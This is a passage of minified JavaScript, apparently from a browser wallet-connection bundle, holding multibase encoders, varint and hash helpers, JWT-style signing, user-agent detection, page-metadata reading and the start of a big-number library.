character`);c=c<<t|d,a+=t,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=t||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},wbe=(r,e,t)=>{const i=e[e.length-1]==="=",n=(1<<t)-1;let s="",o=0,a=0;for(let c=0;c<r.length;++c)for(a=a<<8|r[c],o+=8;o>t;)o-=t,s+=e[n&a>>o];if(o&&(s+=e[n&a<<t-o]),i)for(;s.length*t&7;)s+="=";return s},ho=({name:r,prefix:e,bitsPerChar:t,alphabet:i})=>rC({prefix:e,name:r,encode(n){return wbe(n,i,t)},decode(n){return mbe(n,i,t,r)}}),bbe=rC({prefix:"\0",name:"identity",encode:r=>dbe(r),decode:r=>ube(r)});var vbe=Object.freeze({__proto__:null,identity:bbe});const ybe=ho({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var xbe=Object.freeze({__proto__:null,base2:ybe});const Cbe=ho({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var Ebe=Object.freeze({__proto__:null,base8:Cbe});const _be=l4({prefix:"9",name:"base10",alphabet:"0123456789"});var Sbe=Object.freeze({__proto__:null,base10:_be});const Abe=ho({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),Ibe=ho({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var Tbe=Object.freeze({__proto__:null,base16:Abe,base16upper:Ibe});const kbe=ho({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),Nbe=ho({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),Pbe=ho({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),$be=ho({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),Rbe=ho({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),Obe=ho({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Bbe=ho({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),Mbe=ho({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),Dbe=ho({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var Lbe=Object.freeze({__proto__:null,base32:kbe,base32upper:Nbe,base32pad:Pbe,base32padupper:$be,base32hex:Rbe,base32hexupper:Obe,base32hexpad:Bbe,base32hexpadupper:Mbe,base32z:Dbe});const Ube=l4({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),jbe=l4({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var Fbe=Object.freeze({__proto__:null,base36:Ube,base36upper:jbe});const qbe=l4({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),zbe=l4({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var Wbe=Object.freeze({__proto__:null,base58btc:qbe,base58flickr:zbe});const Hbe=ho({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),Vbe=ho({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),Kbe=ho({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),Gbe=ho({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var Zbe=Object.freeze({__proto__:null,base64:Hbe,base64pad:Vbe,base64url:Kbe,base64urlpad:Gbe});const cQ=Array.from(""),Ybe=cQ.reduce((r,e,t)=>(r[t]=e,r),[]),Jbe=cQ.reduce((r,e,t)=>(r[e.codePointAt(0)]=t,r),[]);function Qbe(r){return r.reduce((e,t)=>(e+=Ybe[t],e),"")}function Xbe(r){const e=[];for(const t of r){const i=Jbe[t.codePointAt(0)];if(i===void 0)throw new Error(`Non-base256emoji character: ${t}`);e.push(i)}return new Uint8Array(e)}const e5e=rC({prefix:"",name:"base256emoji",encode:Qbe,decode:Xbe});var t5e=Object.freeze({__proto__:null,base256emoji:e5e}),r5e=lQ,rU=128,i5e=-128,n5e=Math.pow(2,31);function lQ(r,e,t){e=e||[],t=t||0;for(var i=t;r>=n5e;)e[t++]=r&255|rU,r/=128;for(;r&i5e;)e[t++]=r&255|rU,r>>>=7;return e[t]=r|0,lQ.bytes=t-i+1,e}var s5e=Ck,o5e=128,iU=127;function Ck(r,i){var t=0,i=i||0,n=0,s=i,o,a=r.length;do{if(s>=a)throw Ck.bytes=0,new RangeError("Could not decode varint");o=r[s++],t+=n<28?(o&iU)<<n:(o&iU)*Math.pow(2,n),n+=7}while(o>=o5e);return Ck.bytes=s-i,t}var a5e=Math.pow(2,7),c5e=Math.pow(2,14),l5e=Math.pow(2,21),u5e=Math.pow(2,28),d5e=Math.pow(2,35),h5e=Math.pow(2,42),f5e=Math.pow(2,49),p5e=Math.pow(2,56),g5e=Math.pow(2,63),m5e=function(r){return r<a5e?1:r<c5e?2:r<l5e?3:r<u5e?4:r<d5e?5:r<h5e?6:r<f5e?7:r<p5e?8:r<g5e?9:10},w5e={encode:r5e,decode:s5e,encodingLength:m5e},uQ=w5e;const nU=(r,e,t=0)=>(uQ.encode(r,e,t),e),sU=r=>uQ.encodingLength(r),Ek=(r,e)=>{const t=e.byteLength,i=sU(r),n=i+sU(t),s=new Uint8Array(n+t);return nU(r,s,0),nU(t,s,i),s.set(e,n),new b5e(r,t,e,s)};let b5e=class{constructor(e,t,i,n){this.code=e,this.size=t,this.digest=i,this.bytes=n}};const dQ=({name:r,code:e,encode:t})=>new v5e(r,e,t);let v5e=class{constructor(e,t,i){this.name=e,this.code=t,this.encode=i}digest(e){if(e instanceof Uint8Array){const t=this.encode(e);return t instanceof Uint8Array?Ek(this.code,t):t.then(i=>Ek(this.code,i))}else throw Error("Unknown type, must be binary type")}};const hQ=r=>async e=>new Uint8Array(await crypto.subtle.digest(r,e)),y5e=dQ({name:"sha2-256",code:18,encode:hQ("SHA-256")}),x5e=dQ({name:"sha2-512",code:19,encode:hQ("SHA-512")});var C5e=Object.freeze({__proto__:null,sha256:y5e,sha512:x5e});const fQ=0,E5e="identity",pQ=oQ,_5e=r=>Ek(fQ,pQ(r)),S5e={code:fQ,name:E5e,encode:pQ,digest:_5e};var A5e=Object.freeze({__proto__:null,identity:S5e});new TextEncoder,new TextDecoder;const oU={...vbe,...xbe,...Ebe,...Sbe,...Tbe,...Lbe,...Fbe,...Wbe,...Zbe,...t5e};({...C5e,...A5e});function gQ(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const aU=gQ("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),yS=gQ("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=nQ(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),mQ={utf8:aU,"utf-8":aU,hex:oU.base16,latin1:yS,ascii:yS,binary:yS,...oU};function iC(r,e="utf8"){const t=mQ[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r.buffer,r.byteOffset,r.byteLength).toString("utf8"):t.encoder.encode(r).substring(1)}function S3(r,e="utf8"){const t=mQ[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?iR(globalThis.Buffer.from(r,"utf-8")):t.decoder.decode(`${t.prefix}${r}`)}function cU(r){return gu(iC(S3(r,tC),rQ))}function s7(r){return iC(S3(mu(r),rQ),tC)}function nC(r){const e=S3(sbe,tU),t=nbe+iC(sQ([e,r]),tU);return[rbe,ibe,t].join(tbe)}function I5e(r){return iC(r,tC)}function T5e(r){return S3(r,tC)}function k5e(r){return S3([s7(r.header),s7(r.payload)].join(n7),iQ)}function N5e(r){return[s7(r.header),s7(r.payload),I5e(r.signature)].join(n7)}function u0(r){const e=r.split(n7),t=cU(e[0]),i=cU(e[1]),n=T5e(e[2]),s=S3(e.slice(0,2).join(n7),iQ);return{header:t,payload:i,signature:n,data:s}}function Iw(r=HJ(obe)){const e=tQ.getPublicKey(r);return{secretKey:sQ([r,e]),publicKey:e}}async function nR(r,e,t,i,n=fe.fromMiliseconds(Date.now())){const s={alg:X3e,typ:ebe},o=nC(i.publicKey),a=n+t,c={iss:o,sub:r,aud:e,iat:n,exp:a},l=k5e({header:s,payload:c}),u=tQ.sign(l,i.secretKey.slice(0,32));return N5e({header:s,payload:c,signature:u})}var lU=function(r,e,t){if(t||arguments.length===2)for(var i=0,n=e.length,s;i<n;i++)(s||!(i in e))&&(s||(s=Array.prototype.slice.call(e,0,i)),s[i]=e[i]);return r.concat(s||Array.prototype.slice.call(e))},P5e=function(){function r(e,t,i){this.name=e,this.version=t,this.os=i,this.type="browser"}return r}(),$5e=function(){function r(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return r}(),R5e=function(){function r(e,t,i,n){this.name=e,this.version=t,this.os=i,this.bot=n,this.type="bot-device"}return r}(),O5e=function(){function r(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return r}(),B5e=function(){function r(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return r}(),M5e=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,D5e=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,uU=3,L5e=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",M5e]],dU=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function sR(r){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new B5e:typeof navigator<"u"?j5e(navigator.userAgent):q5e()}function U5e(r){return r!==""&&L5e.reduce(function(e,t){var i=t[0],n=t[1];if(e)return e;var s=n.exec(r);return!!s&&[i,s]},!1)}function j5e(r){var e=U5e(r);if(!e)return null;var t=e[0],i=e[1];if(t==="searchbot")return new O5e;var n=i[1]&&i[1].split(".").join("_").split("_").slice(0,3);n?n.length<uU&&(n=lU(lU([],n,!0),z5e(uU-n.length),!0)):n=[];var s=n.join("."),o=F5e(r),a=D5e.exec(r);return a&&a[1]?new R5e(t,s,o,a[1]):new P5e(t,s,o)}function F5e(r){for(var e=0,t=dU.length;e<t;e++){var i=dU[e],n=i[0],s=i[1],o=s.exec(r);if(o)return n}return null}function q5e(){var r=typeof process<"u"&&process.version;return r?new $5e(process.version.slice(1)):null}function z5e(r){for(var e=[],t=0;t<r;t++)e.push("0");return e}var Zi={},hU;function wQ(){if(hU)return Zi;hU=1,Object.defineProperty(Zi,"__esModule",{value:!0}),Zi.getLocalStorage=Zi.getLocalStorageOrThrow=Zi.getCrypto=Zi.getCryptoOrThrow=Zi.getLocation=Zi.getLocationOrThrow=Zi.getNavigator=Zi.getNavigatorOrThrow=Zi.getDocument=Zi.getDocumentOrThrow=Zi.getFromWindowOrThrow=Zi.getFromWindow=void 0;function r(h){let f;return typeof window<"u"&&typeof window[h]<"u"&&(f=window[h]),f}Zi.getFromWindow=r;function e(h){const f=r(h);if(!f)throw new Error(`${h} is not defined in Window`);return f}Zi.getFromWindowOrThrow=e;function t(){return e("document")}Zi.getDocumentOrThrow=t;function i(){return r("document")}Zi.getDocument=i;function n(){return e("navigator")}Zi.getNavigatorOrThrow=n;function s(){return r("navigator")}Zi.getNavigator=s;function o(){return e("location")}Zi.getLocationOrThrow=o;function a(){return r("location")}Zi.getLocation=a;function c(){return e("crypto")}Zi.getCryptoOrThrow=c;function l(){return r("crypto")}Zi.getCrypto=l;function u(){return e("localStorage")}Zi.getLocalStorageOrThrow=u;function d(){return r("localStorage")}return Zi.getLocalStorage=d,Zi}var vn=wQ(),mb={},fU;function W5e(){if(fU)return mb;fU=1,Object.defineProperty(mb,"__esModule",{value:!0}),mb.getWindowMetadata=void 0;const r=wQ();function e(){let t,i;try{t=r.getDocumentOrThrow(),i=r.getLocationOrThrow()}catch{return null}function n(){const f=t.getElementsByTagName("link"),p=[];for(let g=0;g<f.length;g++){const w=f[g],m=w.getAttribute("rel");if(m&&m.toLowerCase().indexOf("icon")>-1){const x=w.getAttribute("href");if(x)if(x.toLowerCase().indexOf("https:")===-1&&x.toLowerCase().indexOf("http:")===-1&&x.indexOf("//")!==0){let S=i.protocol+"//"+i.host;if(x.indexOf("/")===0)S+=x;else{const T=i.pathname.split("/");T.pop();const k=T.join("/");S+=k+"/"+x}p.push(S)}else if(x.indexOf("//")===0){const S=i.protocol+x;p.push(S)}else p.push(x)}}return p}function s(...f){const p=t.getElementsByTagName("meta");for(let g=0;g<p.length;g++){const w=p[g],m=["itemprop","property","name"].map(x=>w.getAttribute(x)).filter(x=>x?f.includes(x):!1);if(m.length&&m){const x=w.getAttribute("content");if(x)return x}}return""}function o(){let f=s("name","og:site_name","og:title","twitter:title");return f||(f=t.title),f}function a(){return s("description","og:description","twitter:description","keywords")}const c=o(),l=a(),u=i.origin,d=n();return{description:l,url:u,icons:d,name:c}}return mb.getWindowMetadata=e,mb}var oR=W5e(),pU;(function(r){r[r.legacy=0]="legacy",r[r.eip2930=1]="eip2930",r[r.eip1559=2]="eip1559"})(pU||(pU={}));function H5e(r){const e=Mx(r);return Oi(Nn(Ui(Nn(e,1)),12))}function V5e(r,e){return H5e(y$(ze(r),e))}function bQ(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(r):new Uint8Array(r)}function qf(r,e){e||(e=r.reduce((n,s)=>n+s.length,0));const t=bQ(e);let i=0;for(const n of r)t.set(n,i),i+=n.length;return t}function K5e(r,e){if(r.length>=255)throw new TypeError("Alphabet too long");for(var t=new Uint8Array(256),i=0;i<t.length;i++)t[i]=255;for(var n=0;n<r.length;n++){var s=r.charAt(n),o=s.charCodeAt(0);if(t[o]!==255)throw new TypeError(s+" is ambiguous");t[o]=n}var a=r.length,c=r.charAt(0),l=Math.log(a)/Math.log(256),u=Math.log(256)/Math.log(a);function d(p){if(p instanceof Uint8Array||(ArrayBuffer.isView(p)?p=new Uint8Array(p.buffer,p.byteOffset,p.byteLength):Array.isArray(p)&&(p=Uint8Array.from(p))),!(p instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(p.length===0)return"";for(var g=0,w=0,m=0,x=p.length;m!==x&&p[m]===0;)m++,g++;for(var S=(x-m)*u+1>>>0,T=new Uint8Array(S);m!==x;){for(var k=p[m],I=0,E=S-1;(k!==0||I<w)&&E!==-1;E--,I++)k+=256*T[E]>>>0,T[E]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");w=I,m++}for(var C=S-w;C!==S&&T[C]===0;)C++;for(var N=c.repeat(g);C<S;++C)N+=r.charAt(T[C]);return N}function h(p){if(typeof p!="string")throw new TypeError("Expected String");if(p.length===0)return new Uint8Array;var g=0;if(p[g]!==" "){for(var w=0,m=0;p[g]===c;)w++,g++;for(var x=(p.length-g)*l+1>>>0,S=new Uint8Array(x);p[g];){var T=t[p.charCodeAt(g)];if(T===255)return;for(var k=0,I=x-1;(T!==0||k<m)&&I!==-1;I--,k++)T+=a*S[I]>>>0,S[I]=T%256>>>0,T=T/256>>>0;if(T!==0)throw new Error("Non-zero carry");m=k,g++}if(p[g]!==" "){for(var E=x-m;E!==x&&S[E]===0;)E++;for(var C=new Uint8Array(w+(x-E)),N=w;E!==x;)C[N++]=S[E++];return C}}}function f(p){var g=h(p);if(g)return g;throw new Error(`Non-${e} character`)}return{encode:d,decodeUnsafe:h,decode:f}}var G5e=K5e,Z5e=G5e;const Y5e=r=>{if(r instanceof Uint8Array&&r.constructor.name==="Uint8Array")return r;if(r instanceof ArrayBuffer)return new Uint8Array(r);if(ArrayBuffer.isView(r))return new Uint8Array(r.buffer,r.byteOffset,r.byteLength);throw new Error("Unknown type, must be binary type")},J5e=r=>new TextEncoder().encode(r),Q5e=r=>new TextDecoder().decode(r);let X5e=class{constructor(e,t,i){this.name=e,this.prefix=t,this.baseEncode=i}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}},eve=class{constructor(e,t,i){if(this.name=e,this.prefix=t,t.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=t.codePointAt(0),this.baseDecode=i}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return vQ(this,e)}};class tve{constructor(e){this.decoders=e}or(e){return vQ(this,e)}decode(e){const t=e[0],i=this.decoders[t];if(i)return i.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const vQ=(r,e)=>new tve({...r.decoders||{[r.prefix]:r},...e.decoders||{[e.prefix]:e}});class rve{constructor(e,t,i,n){this.name=e,this.prefix=t,this.baseEncode=i,this.baseDecode=n,this.encoder=new X5e(e,t,i),this.decoder=new eve(e,t,n)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const sC=({name:r,prefix:e,encode:t,decode:i})=>new rve(r,e,t,i),u4=({prefix:r,name:e,alphabet:t})=>{const{encode:i,decode:n}=Z5e(t,e);return sC({prefix:r,name:e,encode:i,decode:s=>Y5e(n(s))})},ive=(r,e,t,i)=>{const n={};for(let u=0;u<e.length;++u)n[e[u]]=u;let s=r.length;for(;r[s-1]==="=";)--s;const o=new Uint8Array(s*t/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const d=n[r[u]];if(d===void 0)throw new SyntaxError(`Non-${i} character`);c=c<<t|d,a+=t,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=t||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},nve=(r,e,t)=>{const i=e[e.length-1]==="=",n=(1<<t)-1;let s="",o=0,a=0;for(let c=0;c<r.length;++c)for(a=a<<8|r[c],o+=8;o>t;)o-=t,s+=e[n&a>>o];if(o&&(s+=e[n&a<<t-o]),i)for(;s.length*t&7;)s+="=";return s},fo=({name:r,prefix:e,bitsPerChar:t,alphabet:i})=>sC({prefix:e,name:r,encode(n){return nve(n,i,t)},decode(n){return ive(n,i,t,r)}}),sve=sC({prefix:"\0",name:"identity",encode:r=>Q5e(r),decode:r=>J5e(r)}),ove=Object.freeze(Object.defineProperty({__proto__:null,identity:sve},Symbol.toStringTag,{value:"Module"})),ave=fo({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),cve=Object.freeze(Object.defineProperty({__proto__:null,base2:ave},Symbol.toStringTag,{value:"Module"})),lve=fo({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),uve=Object.freeze(Object.defineProperty({__proto__:null,base8:lve},Symbol.toStringTag,{value:"Module"})),dve=u4({prefix:"9",name:"base10",alphabet:"0123456789"}),hve=Object.freeze(Object.defineProperty({__proto__:null,base10:dve},Symbol.toStringTag,{value:"Module"})),fve=fo({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),pve=fo({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),gve=Object.freeze(Object.defineProperty({__proto__:null,base16:fve,base16upper:pve},Symbol.toStringTag,{value:"Module"})),mve=fo({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),wve=fo({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),bve=fo({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),vve=fo({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),yve=fo({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),xve=fo({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),Cve=fo({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),Eve=fo({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),_ve=fo({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),Sve=Object.freeze(Object.defineProperty({__proto__:null,base32:mve,base32hex:yve,base32hexpad:Cve,base32hexpadupper:Eve,base32hexupper:xve,base32pad:bve,base32padupper:vve,base32upper:wve,base32z:_ve},Symbol.toStringTag,{value:"Module"})),Ave=u4({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),Ive=u4({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),Tve=Object.freeze(Object.defineProperty({__proto__:null,base36:Ave,base36upper:Ive},Symbol.toStringTag,{value:"Module"})),kve=u4({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),Nve=u4({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),Pve=Object.freeze(Object.defineProperty({__proto__:null,base58btc:kve,base58flickr:Nve},Symbol.toStringTag,{value:"Module"})),$ve=fo({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),Rve=fo({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),Ove=fo({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),Bve=fo({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),Mve=Object.freeze(Object.defineProperty({__proto__:null,base64:$ve,base64pad:Rve,base64url:Ove,base64urlpad:Bve},Symbol.toStringTag,{value:"Module"})),yQ=Array.from(""),Dve=yQ.reduce((r,e,t)=>(r[t]=e,r),[]),Lve=yQ.reduce((r,e,t)=>(r[e.codePointAt(0)]=t,r),[]);function Uve(r){return r.reduce((e,t)=>(e+=Dve[t],e),"")}function jve(r){const e=[];for(const t of r){const i=Lve[t.codePointAt(0)];if(i===void 0)throw new Error(`Non-base256emoji character: ${t}`);e.push(i)}return new Uint8Array(e)}const Fve=sC({prefix:"",name:"base256emoji",encode:Uve,decode:jve}),qve=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:Fve},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const o7={...ove,...cve,...uve,...hve,...gve,...Sve,...Tve,...Pve,...Mve,...qve};function xQ(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const gU=xQ("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),xS=xQ("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=bQ(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),CQ={utf8:gU,"utf-8":gU,hex:o7.base16,latin1:xS,ascii:xS,binary:xS,...o7};function En(r,e="utf8"){const t=CQ[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r,"utf8"):t.decoder.decode(`${t.prefix}${r}`)}function Fi(r,e="utf8"){const t=CQ[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r.buffer,r.byteOffset,r.byteLength).toString("utf8"):t.encoder.encode(r).substring(1)}var CS={};const zve="6.6.1",Wve={version:zve};var ES={},s9={exports:{}},Hve=s9.exports,mU;function k0(){return mU||(mU=1,function(r){(function(e,t){function i($,y){if(!$)throw new Error(y||"Assertion failed")}function n($,y){$.super_=y;var A=function(){};A.prototype=y.prototype,$.prototype=new A,$.prototype.constructor=$}function s($,y,A){if(s.isBN($))return $;this.negative=0,this.words=null,this.length=0,this.red=null,$!==null&&((y==="le"||y==="be")&&(A=y,y=10),this._init($||0,y||10,A||"be"))}typeof e=="object"?e.exports=s:t.BN=s,s.BN=s,s.wordSize=26;var o;try{typeof window<"u"&&typeof window.Buffer<"u"?o=window.Buffer:o=w3.Buffer}catch{}s.isBN=function(y){return y instanceof s?!0:y!==null&&typeof y=="object"&&y.constructor.wordSize===s.wordSize&&Array.isArray(y.words)},s.max=function(y,A){return y.cmp(A)>0?y:A},s.min=function(y,A){return y.cmp(A)<0?y:A},s.prototype._init=function(y,A,b){if(typeof y=="number")return this._initNumber(y,A,b);if(typeof y=="object")return this._initArray(y,A,b);A==="hex"&&(A=16),i(A===(A|0)&&A>=2&&A<=36),y=y.toString().replace(/\s+/g,"");var 